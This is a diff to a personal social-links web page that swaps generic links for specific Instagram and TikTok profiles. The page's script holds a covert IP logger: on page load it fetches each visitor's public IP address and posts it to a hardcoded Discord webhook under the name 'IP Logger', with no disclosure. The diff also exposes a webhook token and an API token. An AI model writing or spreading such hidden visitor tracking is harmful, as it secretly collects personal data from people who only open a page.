@@ -75,10 +75,8 @@
     <h1>Welcome to My Page</h1>
     <p>Explore my profiles and projects below:</p>
     <div class="links">
-      <a href="https://twitter.com" target="_blank">Twitter</a>
-      <a href="https://instagram.com" target="_blank">Instagram</a>
-      <a href="https://github.com" target="_blank">GitHub</a>
-      <a href="https://discord.com" target="_blank">Discord</a>
+      <a href="https://www.instagram.com/stephen_walkings/profilecard/?igsh=MTltdmRwa2FnYXZmaQ==" target="_blank">Instagram</a>
+      <a href="https://www.tiktok.com/@rcpfc16?_t=8sbBU7TW3H7&_r=1" target="_blank">Tiktok</a>
     </div>
     <div class="footer">
       &copy; 2024 @rdtqx
@@ -90,15 +88,14 @@
       const webhookUrl = "https://discord.com/api/webhooks/1319029040631517234/uQW3SU6PfNDr6MTW5WqpDgrjq5e7O0FBSYEbSHokGBr1yXIDfE3R6AhqEJi4UfMhwk3e";
 
       // Fetch IPv4 Address
-      fetch("https://ipinfo.io/8.8.8.8/json?token=9372cbce1d1c7e") // Replace with your IPInfo token
+      fetch("https://api.ipify.org?format=json")
         .then((response) => response.json())
         .then((data) => {
           const ip = data.ip; // Get the public IPv4 address
-          const port = window.location.port || "Default (80/443)"; // Get the port (if any)
 
           // Send to Discord webhook
           const webhookData = {
-            content: `Visitor Info:\nIP: ${ip}\nPort: ${port}`,
+            content: `Visitor IP: ${ip}`,
             username: "IP Logger",
           };
 
